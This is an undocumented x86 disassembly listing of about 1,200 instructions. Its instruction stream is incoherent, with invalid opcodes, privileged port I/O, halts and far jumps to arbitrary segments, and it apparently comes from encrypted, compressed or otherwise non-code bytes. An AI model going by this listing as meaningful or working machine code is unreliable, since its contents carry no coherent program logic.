  40fb95:	rol    BYTE PTR [edx-0x1c],1
  40fb98:	jle    0x40fbd6
  40fb9a:	jno    0x40fb4b
  40fb9c:	or     al,0xb5
  40fb9e:	push   ebx
  40fb9f:	daa    
  40fba0:	pop    ebx
  40fba1:	scas   al,BYTE PTR es:[edi]
  40fba2:	dec    esp
  40fba3:	push   edx
  40fba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fba5:	jae    0x40fbdd
  40fba7:	data16 jmp 0x40fb34
  40fbaa:	out    0x7,eax
  40fbac:	mov    edi,fs
  40fbae:	in     al,dx
  40fbaf:	int    0xc9
  40fbb1:	in     al,0xc3
  40fbb3:	dec    edi
  40fbb4:	push   ds
  40fbb5:	cmp    bh,dl
  40fbb7:	xor    al,0xd2
  40fbb9:	xchg   ebp,eax
  40fbba:	fiadd  WORD PTR [ebx+0x4854ad8b]
  40fbc0:	popf   
  40fbc1:	and    BYTE PTR [ecx+0x772a2f0],dh
  40fbc7:	xchg   edi,eax
  40fbc8:	and    cl,BYTE PTR [ebx]
  40fbca:	dec    eax
  40fbcb:	adc    ah,BYTE PTR [eax+0x48b88741]
  40fbd1:	imul   ecx,DWORD PTR [esi+ebx*2-0x61af989d],0xffffff8b
  40fbd9:	xor    edx,DWORD PTR [edi]
  40fbdb:	in     eax,dx
  40fbdc:	or     ebp,DWORD PTR [edi-0x545ea6f5]
  40fbe2:	adc    BYTE PTR [ecx-0x1c8fb53d],ch
  40fbe8:	adc    esp,DWORD PTR [ebx+0x27427ba9]
  40fbee:	jmp    0x40fbf7
  40fbf0:	push   0xa484abd5
  40fbf5:	out    dx,al
  40fbf6:	cmp    dl,BYTE PTR [ecx]
  40fbf8:	rol    DWORD PTR [edx-0x51],1
  40fbfb:	mov    ecx,DWORD PTR [ecx]
  40fbfd:	outs   dx,BYTE PTR ds:[esi]
  40fbfe:	xchg   esp,eax
  40fbff:	mov    es,WORD PTR [edi+0x2fdfeabf]
  40fc05:	fcomp  DWORD PTR [edi-0x66]
  40fc08:	sub    cl,BYTE PTR [ebx+edx*4-0x36]
  40fc0c:	or     al,0x5
  40fc0e:	fnstcw WORD PTR [ecx-0x3f]
  40fc11:	ja     0x40fbdb
  40fc13:	and    al,0x86
  40fc15:	outs   dx,DWORD PTR ds:[esi]
  40fc16:	or     ecx,DWORD PTR [ecx+0x316676ef]
  40fc1c:	stc    
  40fc1d:	jl     0x40fbcc
  40fc1f:	and    BYTE PTR [ebx],ah
  40fc21:	fld    TBYTE PTR [ecx]
  40fc23:	pop    edx
  40fc24:	popa   
  40fc25:	adc    BYTE PTR [esi+0x12],bh
  40fc28:	hlt    
  40fc29:	call   0xfdbec228
  40fc2e:	adc    esi,DWORD PTR [ecx]
  40fc30:	dec    edi
  40fc31:	pop    ds
  40fc32:	dec    edx
  40fc33:	add    dl,BYTE PTR [edi]
  40fc35:	inc    esi
  40fc36:	mov    ch,0x6c
  40fc38:	ds push es
  40fc3a:	xor    cl,BYTE PTR [edx+0x39]
  40fc3d:	xchg   edx,eax
  40fc3e:	call   0x63fa:0xaa5a9d72
  40fc45:	mov    bl,BYTE PTR [eax-0x13c76965]
  40fc4b:	ret    
  40fc4c:	mov    ds:0xc1a30af,al
  40fc51:	fs iret 
  40fc53:	(bad)  
  40fc54:	ret    
  40fc55:	cwde   
  40fc56:	adc    esp,esp
  40fc58:	outs   dx,BYTE PTR cs:[esi]
  40fc5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc5b:	aad    0xc1
  40fc5d:	int    0xa4
  40fc5f:	mov    eax,ds:0x54cb2a9c
  40fc64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc65:	popa   
  40fc66:	inc    ebp
  40fc67:	call   0x21956437
  40fc6c:	push   ds
  40fc6d:	sbb    dl,0x7c
  40fc70:	iret   
  40fc71:	das    
  40fc72:	add    eax,DWORD PTR [ecx]
  40fc74:	push   es
  40fc75:	cmp    bl,al
  40fc77:	push   edi
  40fc78:	sbb    DWORD PTR [ecx+0x87cf831],0x67084455
  40fc82:	inc    ecx
  40fc83:	(bad)  
  40fc84:	pop    ecx
  40fc85:	xlat   BYTE PTR ds:[ebx]
  40fc86:	in     eax,dx
  40fc87:	loope  0x40fcc2
  40fc89:	loopne 0x40fcec
  40fc8b:	retf   
  40fc8c:	push   ebp
  40fc8d:	pop    edx
  40fc8e:	sahf   
  40fc8f:	jo     0x40fcb0
  40fc91:	mov    al,0xeb
  40fc93:	popa   
  40fc94:	in     al,0x7c
  40fc96:	and    edi,DWORD PTR [eax+0x32]
  40fc99:	jle    0x40fc84
  40fc9b:	mov    esi,0x1ac5d1c4
  40fca0:	jl     0x40fc3b
  40fca2:	rcr    BYTE PTR [ebx],0xda
  40fca5:	pop    ss
  40fca6:	mov    edx,0x679197f8
  40fcab:	sub    dl,bh
  40fcad:	pushf  
  40fcae:	fcomp  DWORD PTR [esi+ecx*4]
  40fcb1:	cmp    edi,ebx
  40fcb3:	mov    al,0xe6
  40fcb5:	lds    esi,FWORD PTR [edi-0x71ea3945]
  40fcbb:	or     DWORD PTR [ecx+0x71],esp
  40fcbe:	mov    bh,0x3
  40fcc0:	fsub   DWORD PTR [esi+0x55]
  40fcc3:	pop    es
  40fcc4:	js     0x40fc75
  40fcc6:	cmp    al,0x62
  40fcc8:	jno    0x40fcf6
  40fcca:	inc    ebx
  40fccb:	retf   
  40fccc:	stos   BYTE PTR es:[edi],al
  40fccd:	mov    bl,0xb5
  40fccf:	aad    0x24
  40fcd1:	fbld   TBYTE PTR ds:0xabe4bde5
  40fcd7:	mov    eax,ds:0xf6e0ed1f
  40fcdc:	cli    
  40fcdd:	scas   al,BYTE PTR es:[edi]
  40fcde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcdf:	mov    esp,0x398f3028
  40fce4:	push   0xb96afd53
  40fce9:	or     BYTE PTR [edi-0x41],0xf0
  40fced:	sbb    esp,DWORD PTR [ebx+0xf75237b]
  40fcf3:	or     al,0x5a
  40fcf5:	and    al,0x80
  40fcf7:	popf   
  40fcf8:	mov    eax,ds:0x60cfb76c
  40fcfd:	das    
  40fcfe:	imul   eax,DWORD PTR ds:0x7a6e40cd,0xf5e0c6db
  40fd08:	call   0x890a:0x7e902d41
  40fd0f:	loopne 0x40fd37
  40fd11:	inc    edi
  40fd12:	in     al,dx
  40fd13:	pop    ecx
  40fd14:	aaa    
  40fd15:	sti    
  40fd16:	test   DWORD PTR [ecx+edx*1-0x285aa5ce],edi
  40fd1d:	in     al,dx
  40fd1e:	shl    dh,1
  40fd20:	cwde   
  40fd21:	shl    esp,cl
  40fd23:	or     ecx,DWORD PTR [edx]
  40fd25:	xor    DWORD PTR [eax-0x5a],0xffffffb4
  40fd29:	pop    eax
  40fd2a:	into   
  40fd2b:	aaa    
  40fd2c:	out    dx,eax
  40fd2d:	int    0x95
  40fd2f:	jnp    0x40fd1b
  40fd31:	ret    0x9321
  40fd34:	scas   eax,DWORD PTR es:[edi]
  40fd35:	mov    esi,0x6a21e6f0
  40fd3a:	loopne 0x40fda1
  40fd3c:	mov    edi,0xbf07434b
  40fd41:	add    eax,esi
  40fd43:	push   0xb1afd878
  40fd48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd49:	data16 jnp 0x40fccd
  40fd4c:	adc    BYTE PTR ds:0x410d9f31,bl
  40fd52:	sar    DWORD PTR [ecx+edx*8-0x3092cc38],1
  40fd59:	imul   ecx,DWORD PTR [ecx-0x636f9b6a],0xffffffcf
  40fd60:	add    al,dh
  40fd62:	dec    esp
  40fd63:	ins    DWORD PTR es:[edi],dx
  40fd64:	pushf  
  40fd65:	in     eax,dx
  40fd66:	and    eax,0x946a8452
  40fd6b:	adc    BYTE PTR [edx-0x2a06ddd0],ch
  40fd71:	jb     0x40fcfa
  40fd73:	sbb    BYTE PTR [ebp-0x49302cb5],0x11
  40fd7a:	add    eax,0xcd7a563e
  40fd7f:	cwde   
  40fd80:	adc    eax,0x3582cef4
  40fd85:	sahf   
  40fd86:	pop    edi
  40fd87:	std    
  40fd88:	jns    0x40fdee
  40fd8a:	jle    0x40fd7a
  40fd8c:	or     ebp,esi
  40fd8e:	lahf   
  40fd8f:	outs   dx,DWORD PTR ds:[esi]
  40fd90:	inc    esp
  40fd91:	mov    eax,ds:0x3b838a28
  40fd96:	inc    ecx
  40fd97:	mov    ebp,0x47411dc5
  40fd9c:	xor    BYTE PTR [edi+0x33],cl
  40fd9f:	loope  0x40fde1
  40fda1:	imul   edx,DWORD PTR [eax+0x15081e39],0xb472cc4d
  40fdab:	push   ds
  40fdac:	pop    ecx
  40fdad:	adc    DWORD PTR [edx],edx
  40fdaf:	es mov eax,0x13ab9380
  40fdb5:	mov    ecx,gs
  40fdb7:	ja     0x40fd41
  40fdb9:	out    dx,eax
  40fdba:	aam    0xc3
  40fdbc:	cmp    eax,DWORD PTR [ecx-0x741fc674]
  40fdc2:	inc    edi
  40fdc3:	jmp    0xd643:0xc0d9885f
  40fdca:	mov    eax,ds:0xe1e7e42f
  40fdcf:	js     0x40fdae
  40fdd1:	mov    esi,0xddbc2a08
  40fdd6:	sbb    dl,BYTE PTR [esi]
  40fdd8:	sti    
  40fdd9:	add    eax,0x4ed4e221
  40fdde:	jg     0x40fdeb
  40fde0:	ror    BYTE PTR [edi-0x6c3a701c],cl
  40fde6:	xchg   edi,eax
  40fde7:	scas   eax,DWORD PTR es:[edi]
  40fde8:	fsubr  QWORD PTR [edx]
  40fdea:	adc    DWORD PTR [ebx],edx
  40fdec:	push   esi
  40fded:	or     al,0x2e
  40fdef:	mov    esp,0x2d6219fc
  40fdf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdf5:	or     eax,0xc394225f
  40fdfa:	sub    al,0xe2
  40fdfc:	popf   
  40fdfd:	aas    
  40fdfe:	pop    ecx
  40fdff:	adc    ah,BYTE PTR [edi+ebx*2+0x305747c7]
  40fe06:	cmp    ebx,DWORD PTR [eax]
  40fe08:	xchg   DWORD PTR [ebp+0x42],esp
  40fe0b:	and    BYTE PTR [edx],al
  40fe0d:	iret   
  40fe0e:	sbb    DWORD PTR [edi-0x2f],0x2f169d88
  40fe15:	into   
  40fe16:	cmp    BYTE PTR [esp+ecx*2-0x1bee8c3f],dh
  40fe1d:	retf   
  40fe1e:	(bad)  
  40fe1f:	lock dec ebp
  40fe21:	outs   dx,BYTE PTR ds:[esi]
  40fe22:	xor    dh,BYTE PTR [ebp-0x3d1b717a]
  40fe28:	xor    esp,DWORD PTR [ebx-0x63]
  40fe2b:	push   esi
  40fe2c:	call   0xec4b0a52
  40fe31:	lock loopne 0x40fdd8
  40fe34:	test   al,0xe2
  40fe36:	inc    edi
  40fe37:	gs and al,0xd8
  40fe3a:	pop    edi
  40fe3b:	push   0xa
  40fe3d:	ret    
  40fe3e:	repnz push eax
  40fe40:	mov    eax,ds:0x338e61ba
  40fe45:	cwde   
  40fe46:	or     eax,0xb8304c40
  40fe4b:	pop    eax
  40fe4c:	cdq    
  40fe4d:	sbb    DWORD PTR [edx-0x60cf8050],edx
  40fe53:	sbb    bl,BYTE PTR [edi]
  40fe55:	or     dl,bl
  40fe57:	shr    DWORD PTR [edx],0x66
  40fe5a:	scas   eax,DWORD PTR es:[edi]
  40fe5b:	xchg   ebx,eax
  40fe5c:	sbb    eax,0xe06158fc
  40fe61:	jle    0x40fe87
  40fe63:	cld    
  40fe64:	lds    eax,FWORD PTR [ecx+0x5525def2]
  40fe6a:	cmp    cl,BYTE PTR [esi]
  40fe6c:	add    BYTE PTR [eax+ecx*2+0x4e],ch
  40fe70:	sub    BYTE PTR [edx],0x32
  40fe73:	mov    ebp,0x9085dde
  40fe78:	(bad)  
  40fe79:	lock mov edx,0x52d05207
  40fe7f:	rcr    DWORD PTR [edx+0x5a],1
  40fe82:	mov    cl,0xb7
  40fe84:	pushf  
  40fe85:	(bad)  
  40fe86:	data16 or al,0xc5
  40fe89:	addr16 loop 0x40fef6
  40fe8c:	aaa    
  40fe8d:	inc    edx
  40fe8e:	out    0xc,eax
  40fe90:	or     eax,0x1b7ad4e0
  40fe95:	enter  0x7d01,0x30
  40fe99:	sbb    BYTE PTR [edx+0x38],al
  40fe9c:	mov    esp,DWORD PTR [edx+0x506a6fd1]
  40fea2:	push   ecx
  40fea3:	mov    al,0x44
  40fea5:	fsub   DWORD PTR [eax+0x60]
  40fea8:	pop    esp
  40fea9:	lea    esp,[edi+0x53]
  40feac:	push   eax
  40fead:	ds pop edx
  40feaf:	sub    al,0x4c
  40feb1:	push   ebp
  40feb2:	jno    0x40feab
  40feb4:	sbb    BYTE PTR [edx+ebx*2+0x182e7ca8],cl
  40febb:	pop    edi
  40febc:	mov    edx,DWORD PTR [esi]
  40febe:	stos   DWORD PTR es:[edi],eax
  40febf:	ror    DWORD PTR [edx+0x70019ab1],0x90
  40fec6:	int3   
  40fec7:	push   es
  40fec8:	fistp  QWORD PTR [edi+0x230a8514]
  40fece:	mov    dh,0x7b
  40fed0:	dec    esp
  40fed1:	or     BYTE PTR [edx+ebp*4+0x56],ch
  40fed5:	rcl    BYTE PTR [ecx-0x2113abe],0xc1
  40fedc:	xchg   BYTE PTR [edx+ebp*4+0x36],dl
  40fee0:	dec    eax
  40fee1:	(bad)  
  40fee3:	test   DWORD PTR gs:[edx+esi*2-0x50],esi
  40fee8:	pop    ss
  40fee9:	not    BYTE PTR [ebx-0x247654f4]
  40feef:	inc    esp
  40fef0:	sbb    esi,esp
  40fef2:	jns    0x40fec6
  40fef4:	fsubr  st,st(5)
  40fef6:	dec    esi
  40fef7:	icebp  
  40fef8:	mov    ds:0x67cd1a5d,al
  40fefd:	dec    esi
  40fefe:	xchg   esi,eax
  40feff:	cmp    DWORD PTR [esi],esp
  40ff01:	pop    ebx
  40ff02:	popa   
  40ff03:	lods   al,BYTE PTR ds:[esi]
  40ff04:	jge    0x40ff04
  40ff06:	pop    edx
  40ff07:	int    0xa0
  40ff09:	std    
  40ff0a:	inc    esp
  40ff0b:	into   
  40ff0c:	and    al,0x49
  40ff0e:	sub    BYTE PTR [ebp-0x61775406],ah
  40ff14:	jo     0x40ff01
  40ff16:	cs test al,0x7d
  40ff19:	mov    ebp,0x755d7463
  40ff1e:	fist   DWORD PTR [ecx-0x5819ad6c]
  40ff24:	fstp   TBYTE PTR [ebp+0xc3f4822]
  40ff2a:	les    ecx,FWORD PTR [ecx+0x5a]
  40ff2d:	imul   esi,esp,0x7f
  40ff30:	cmp    eax,DWORD PTR [edi]
  40ff32:	mov    bh,0xb
  40ff34:	mov    esp,0x996af688
  40ff39:	enter  0x6a24,0x8
  40ff3d:	adc    DWORD PTR [edi+ebx*2],ebx
  40ff40:	adc    edi,0xc66d13d3
  40ff46:	es (bad) 
  40ff48:	pop    ecx
  40ff49:	or     edx,DWORD PTR [ebx]
  40ff4b:	lods   al,BYTE PTR ds:[esi]
  40ff4c:	adc    al,0xcb
  40ff4e:	or     al,0xc6
  40ff50:	or     BYTE PTR [ebx-0x16],ch
  40ff53:	fcom   DWORD PTR [ebx+0xf]
  40ff56:	inc    ebp
  40ff57:	sub    edi,ebx
  40ff59:	ins    DWORD PTR es:[edi],dx
  40ff5a:	into   
  40ff5b:	inc    esp
  40ff5c:	jle    0x40ff48
  40ff5e:	inc    ebp
  40ff5f:	imul   eax,DWORD PTR [eax-0x1c21b9b6],0xffffffb0
  40ff66:	aaa    
  40ff67:	js     0x40ff7a
  40ff69:	jecxz  0x40ff98
  40ff6b:	jl     0x40ffd1
  40ff6d:	sub    BYTE PTR ds:0x7b589745,al
  40ff73:	cli    
  40ff74:	lods   al,BYTE PTR ds:[esi]
  40ff75:	enter  0x1162,0xeb
  40ff79:	repz mov ebx,0xc3217a0f
  40ff7f:	in     eax,0xa8
  40ff81:	fs mov edx,0xe1da2ab3
  40ff87:	gs pop esp
  40ff89:	in     eax,dx
  40ff8a:	inc    ebx
  40ff8b:	cmp    bl,BYTE PTR [ecx]
  40ff8d:	mov    bh,0x63
  40ff8f:	sbb    al,0x97
  40ff91:	cli    
  40ff92:	not    BYTE PTR [eax+0x69]
  40ff95:	dec    ebp
  40ff96:	xor    al,0x20
  40ff98:	pop    esp
  40ff99:	aas    
  40ff9a:	mov    ebx,0xa308e5c7
  40ff9f:	aam    0xf7
  40ffa1:	xchg   ecx,eax
  40ffa2:	or     BYTE PTR [edi-0x136de49d],dl
  40ffa8:	mov    bl,0x0
  40ffaa:	in     eax,0xf4
  40ffac:	cs faddp st(4),st
  40ffaf:	push   edi
  40ffb0:	and    al,0x32
  40ffb2:	rcl    cl,cl
  40ffb4:	push   ebx
  40ffb5:	fnop   
  40ffb7:	or     al,0x4a
  40ffb9:	lods   al,BYTE PTR ds:[esi]
  40ffba:	mov    WORD PTR [ebp+0x303abb0b],ss
  40ffc0:	cmc    
  40ffc1:	cmp    eax,0x7c6dc5cc
  40ffc6:	pop    ebx
  40ffc7:	push   ecx
  40ffc8:	ins    BYTE PTR es:[edi],dx
  40ffc9:	popf   
  40ffca:	xchg   esp,eax
  40ffcb:	cmp    BYTE PTR [eax+0x1d4cdbb3],bl
  40ffd1:	bound  ecx,QWORD PTR ds:[ebx+0x4a]
  40ffd5:	inc    eax
  40ffd6:	pop    ebp
  40ffd7:	pop    ecx
  40ffd8:	jle    0x40ffe6
  40ffda:	jmp    0x41001c
  40ffdc:	xlat   BYTE PTR ds:[ebx]
  40ffdd:	adc    edx,edx
  40ffdf:	outs   dx,BYTE PTR ds:[esi]
  40ffe0:	nop
  40ffe1:	in     al,dx
  40ffe2:	and    ah,BYTE PTR [esi-0x6a]
  40ffe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe6:	xchg   ecx,eax
  40ffe7:	sar    BYTE PTR [ecx],0x69
  40ffea:	or     bh,ah
  40ffec:	push   ds
  40ffed:	add    dh,dh
  40ffef:	sub    eax,0xda5bc065
  40fff4:	test   ah,bh
  40fff6:	or     al,BYTE PTR [ebp+0x6c0c2e31]
  40fffc:	jmp    0x6117:0xe77d61d9
  410003:	lea    ebp,[eax-0x24]
  410006:	push   ss
  410007:	mov    edx,eax
  410009:	mov    ecx,edi
  41000b:	mov    eax,ds:0xd79a3271
  410010:	sbb    ch,BYTE PTR [esi+0x4d]
  410013:	ins    BYTE PTR es:[edi],dx
  410014:	(bad)  
  410015:	push   ss
  410016:	mov    cl,0xb
  410018:	add    bh,BYTE PTR [ecx+0x12]
  41001b:	and    ah,BYTE PTR [eax-0x32]
  41001e:	sbb    eax,0x2254f761
  410023:	bound  ebp,QWORD PTR [ecx+0x2c]
  410026:	jl     0x410058
  410028:	mov    dl,0x5d
  41002a:	fidiv  WORD PTR [ecx]
  41002c:	hlt    
  41002d:	jmp    0x5a22:0x4c02564f
  410034:	pop    esp
  410035:	loopne 0x410049
  410037:	pop    esp
  410038:	xchg   edx,eax
  410039:	ja     0x410003
  41003b:	push   0x6fc10b79
  410040:	and    al,0x29
  410042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410043:	jmp    0x4dc0:0x253f4ead
  41004a:	nop
  41004b:	dec    esi
  41004c:	jle    0x410074
  41004e:	(bad)  
  41004f:	aam    0x17
  410051:	mov    esp,ecx
  410053:	fadd   st,st(2)
  410055:	or     eax,0xd35bf7d1
  41005a:	fst    st(0)
  41005c:	stc    
  41005d:	lock aaa 
  41005f:	arpl   WORD PTR [ecx*4-0x681c0a42],ax
  410066:	xor    al,BYTE PTR [edi+ebp*8]
  410069:	aad    0x89
  41006b:	test   DWORD PTR [esi+eax*1+0x211161e4],ebp
  410072:	sbb    eax,0x2cf93861
  410077:	or     DWORD PTR [esi+0x3a],0xffffffb2
  41007b:	pop    edx
  41007c:	rol    BYTE PTR [esi+edi*8+0x4a],0x19
  410081:	dec    ebp
  410082:	jg     0x410090
  410084:	mov    ah,0x29
  410086:	cmp    ebx,ebx
  410088:	push   eax
  410089:	adc    DWORD PTR [eax],edx
  41008b:	fldln2 
  41008d:	test   DWORD PTR [ecx-0x9],eax
  410090:	jnp    0x4100ad
  410092:	scas   al,BYTE PTR es:[edi]
  410093:	and    esi,DWORD PTR [eax]
  410095:	ss sahf 
  410097:	stc    
  410098:	dec    ebx
  410099:	jno    0x4100a2
  41009b:	test   eax,0xc67b0aa
  4100a0:	push   0x33
  4100a2:	test   al,ch
  4100a4:	xor    al,0x2b
  4100a6:	jle    0x41002a
  4100a8:	enter  0xcde2,0x87
  4100ac:	in     al,0x46
  4100ae:	dec    edx
  4100af:	inc    edi
  4100b0:	sub    al,0xa5
  4100b2:	or     DWORD PTR [eax+0x1c],ebx
  4100b5:	mov    bl,0xd2
  4100b7:	pop    ss
  4100b8:	outs   dx,BYTE PTR ds:[esi]
  4100b9:	ins    DWORD PTR es:[edi],dx
  4100ba:	rcl    DWORD PTR [ebp+0x6ab5948e],1
  4100c0:	leave  
  4100c1:	inc    edx
  4100c2:	iret   
  4100c3:	inc    esp
  4100c4:	int    0xfa
  4100c6:	push   esp
  4100c7:	sbb    DWORD PTR [ecx],0x62
  4100ca:	stc    
  4100cb:	in     eax,dx
  4100cc:	xor    DWORD PTR [edi-0x6f],0xffffff89
  4100d0:	cmp    ah,BYTE PTR [ebp-0x5d]
  4100d3:	dec    esi
  4100d4:	gs leave 
  4100d6:	mov    al,bl
  4100d8:	jp     0x410130
  4100da:	push   0xfd802040
  4100df:	xchg   ecx,eax
  4100e0:	(bad)  
  4100e1:	or     cl,bh
  4100e3:	test   al,0x1e
  4100e5:	jle    0x4100f1
  4100e7:	jle    0x410138
  4100e9:	and    DWORD PTR [edx-0x7e],esi
  4100ec:	adc    BYTE PTR [ebx-0x5b],bl
  4100ef:	loopne 0x41008b
  4100f1:	test   eax,0xd7159d62
  4100f6:	mov    ebp,0x1a774c95
  4100fb:	sbb    eax,0x87d05ccf
  410100:	adc    BYTE PTR [edx],bh
  410102:	push   0x75f87b7a
  410107:	fst    DWORD PTR [esi+0x5f69f192]
  41010d:	nop
  41010e:	ins    BYTE PTR es:[edi],dx
  41010f:	in     al,dx
  410110:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  410112:	cmc    
  410113:	adc    edi,eax
  410115:	fwait
  410116:	lea    esi,ds:0xea0c10c0
  41011c:	sub    bl,bh
  41011e:	and    al,0xfa
  410120:	in     al,0x8d
  410122:	stos   BYTE PTR es:[edi],al
  410123:	daa    
  410124:	lds    edx,FWORD PTR [ebp+0x23]
  410127:	and    eax,0x8f51e71e
  41012c:	mov    cl,BYTE PTR [esi-0x11bb6fac]
  410132:	dec    esp
  410133:	inc    eax
  410134:	cs push ebx
  410136:	mov    BYTE PTR [esi+0x14],al
  410139:	fldz   
  41013b:	inc    ebx
  41013c:	nop
  41013d:	or     al,0xc1
  41013f:	scas   eax,DWORD PTR es:[edi]
  410140:	mov    BYTE PTR [edx],al
  410142:	pusha  
  410143:	cmc    
  410144:	push   ecx
  410145:	mov    BYTE PTR [edi],bl
  410147:	jg     0x4100ca
  410149:	cmp    eax,0xc316cfe0
  41014e:	rcr    esi,1
  410150:	clc    
  410151:	lods   al,BYTE PTR ds:[esi]
  410152:	dec    ecx
  410153:	shr    DWORD PTR [eax-0x17],cl
  410156:	or     BYTE PTR ds:0x75eb,cl
  41015b:	sub    eax,0x2b2fb0b2
  410160:	adc    BYTE PTR [ebp-0x3a],cl
  410163:	(bad)  
  410164:	jmp    0x9b86:0x6a050892
  41016b:	icebp  
  41016c:	call   0x1782:0x608c35ef
  410173:	out    dx,eax
  410174:	inc    edi
  410175:	add    BYTE PTR [ecx+0x12fe12d5],dh
  41017b:	sbb    DWORD PTR [esi],esp
  41017d:	mov    ch,0x8c
  41017f:	test   BYTE PTR [ebp+esi*2-0x5e],cl
  410183:	add    eax,0x7fafe114
  410188:	cmp    eax,0xfbb4fa54
  41018d:	jge    0x4101cb
  41018f:	pop    ebx
  410190:	mov    DWORD PTR [ebx],ebp
  410192:	loop   0x410164
  410194:	mov    esp,0xeb3a2964
  410199:	es push edx
  41019b:	inc    ebp
  41019c:	out    dx,eax
  41019d:	cs inc edx
  41019f:	stos   DWORD PTR es:[edi],eax
  4101a0:	mov    edi,0x94765d59
  4101a5:	ins    BYTE PTR es:[edi],dx
  4101a6:	cmp    edi,DWORD PTR [ebp+0x74ac1b75]
  4101ac:	and    al,0xf1
  4101ae:	xchg   edx,eax
  4101af:	sbb    eax,ecx
  4101b1:	cld    
  4101b2:	jno    0x410155
  4101b4:	mov    ch,BYTE PTR [edi]
  4101b6:	ror    bh,1
  4101b8:	fistp  WORD PTR [eax+ebp*4-0x76]
  4101bc:	dec    ecx
  4101bd:	ja     0x41018b
  4101bf:	jl     0x410233
  4101c1:	adc    al,0xb7
  4101c3:	cdq    
  4101c4:	jb     0x410181
  4101c6:	xchg   esp,eax
  4101c7:	mov    esi,0xb89fc1a2
  4101cc:	pop    ebx
  4101cd:	fisubr DWORD PTR [eax+0x54]
  4101d0:	enter  0x89a2,0xd6
  4101d4:	mov    dh,0x29
  4101d6:	aas    
  4101d7:	sub    al,BYTE PTR [eax-0x4160fbb]
  4101dd:	mov    cl,0xbc
  4101df:	sub    DWORD PTR [esi],edx
  4101e1:	mov    ds:0xe6cec33c,eax
  4101e6:	repnz mov eax,ds:0xbab8f378
  4101ec:	stos   DWORD PTR es:[edi],eax
  4101ed:	retf   
  4101ee:	aad    0xb8
  4101f0:	stos   DWORD PTR es:[edi],eax
  4101f1:	jns    0x4101e0
  4101f3:	mov    edx,0xbc83f58
  4101f8:	or     ch,cl
  4101fa:	jg     0x41025e
  4101fc:	sub    eax,0x5ffda925
  410201:	outs   dx,BYTE PTR ds:[esi]
  410202:	shl    DWORD PTR [ecx-0x378b3c02],1
  410208:	inc    DWORD PTR [bx+di-0x78]
  41020c:	fist   WORD PTR [esp+esi*1+0x1]
  410210:	lock xor eax,0x95cdd96d
  410216:	mov    al,0x8
  410218:	cmp    DWORD PTR [esi+0x4d],0x3a
  41021c:	xor    ah,bl
  41021e:	shl    DWORD PTR [ebx+0x5aa6cb1c],1
  410224:	and    eax,0x27143a95
  410229:	mov    edi,edi
  41022b:	(bad)  
  41022c:	(bad)  [ecx]
  41022e:	retf   0x3e0d
  410231:	lahf   
  410232:	push   esp
  410233:	imul   ecx,DWORD PTR [edx+eax*1+0x2e591eec],0xa231c3c6
  41023e:	inc    eax
  41023f:	js     0x41028b
  410241:	aas    
  410242:	inc    esp
  410243:	data16 sub BYTE PTR [ecx],cl
  410246:	cdq    
  410247:	ficom  WORD PTR [edx+0x22989228]
  41024d:	(bad)  
  41024e:	push   esi
  41024f:	or     al,0xa3
  410251:	js     0x4102b1
  410253:	sbb    dl,al
  410255:	inc    edx
  410256:	cli    
  410257:	test   DWORD PTR [eax-0x1ee6b478],edi
  41025d:	int    0xd8
  41025f:	xor    eax,0x128a7aa1
  410264:	mov    al,0x4c
  410266:	inc    edi
  410267:	adc    eax,0x5dc9b4d
  41026c:	push   ebx
  41026d:	mov    bl,0x9a
  41026f:	cs jne 0x4102aa
  410272:	adc    DWORD PTR [ebx],ebp
  410274:	sbb    bh,cl
  410276:	pop    es
  410277:	push   ss
  410278:	int    0x38
  41027a:	xchg   DWORD PTR [ecx],eax
  41027c:	idiv   BYTE PTR [edi+edx*4+0x6e]
  410280:	and    eax,0x14de6787
  410285:	push   edx
  410286:	(bad)  
  410287:	push   ebx
  410288:	stos   DWORD PTR es:[edi],eax
  410289:	and    eax,0xc012ee56
  41028e:	jbe    0x41026d
  410290:	jmp    0xe8cc:0xd0a17e10
  410297:	sbb    esi,DWORD PTR [ebp+0xd]
  41029a:	fadd   DWORD PTR [esi+0x11c02334]
  4102a0:	adc    BYTE PTR ds:0xeda768fa,0x10
  4102a7:	icebp  
  4102a8:	xor    al,BYTE PTR [ecx+0x48ae7f29]
  4102ae:	test   DWORD PTR [ebp-0xe],esp
  4102b1:	ds pop ecx
  4102b3:	je     0x410301
  4102b5:	icebp  
  4102b6:	(bad)  
  4102b7:	es fwait
  4102b9:	lods   eax,DWORD PTR ds:[esi]
  4102ba:	mov    eax,0xefe8d88f
  4102bf:	fistp  WORD PTR [ebx-0x7dccee12]
  4102c5:	jne    0x4102cb
  4102c7:	xchg   ebx,eax
  4102c8:	pop    edi
  4102c9:	or     BYTE PTR [ebp+0x369bd405],al
  4102cf:	out    dx,al
  4102d0:	fs retf 
  4102d2:	sbb    eax,0x3cc6476
  4102d7:	adc    al,0x3e
  4102d9:	frstor [ecx*2-0x32b298e6]
  4102e0:	fimul  DWORD PTR [eax]
  4102e2:	aaa    
  4102e3:	xlat   BYTE PTR ds:[ebx]
  4102e4:	or     BYTE PTR [eax-0x43e1a19c],0x5
  4102eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102ec:	sub    ebx,ebp
  4102ee:	jnp    0x4102c4
  4102f0:	sti    
  4102f1:	add    al,0xa2
  4102f3:	lahf   
  4102f4:	adc    eax,0x2b8d6082
  4102f9:	sub    al,0x1
  4102fb:	fsub   QWORD PTR fs:[eax+0x7d020682]
  410302:	inc    esi
  410303:	lea    ebx,[edi-0x3b]
  410306:	dec    esi
  410307:	call   0x10d5:0x9d05b7d7
  41030e:	and    BYTE PTR ds:0x5949c869,ah
  410314:	or     cl,BYTE PTR ds:[ebx+ecx*2]
  410318:	push   edi
  410319:	inc    esi
  41031a:	lods   eax,DWORD PTR ds:[esi]
  41031b:	xchg   edi,eax
  41031c:	pop    eax
  41031d:	mov    esp,DWORD PTR [edi+0x57]
  410320:	adc    bh,BYTE PTR [eax-0x76c13b3e]
  410326:	add    edx,DWORD PTR [ebp+0x65301d7b]
  41032c:	sub    eax,0xb73820a6
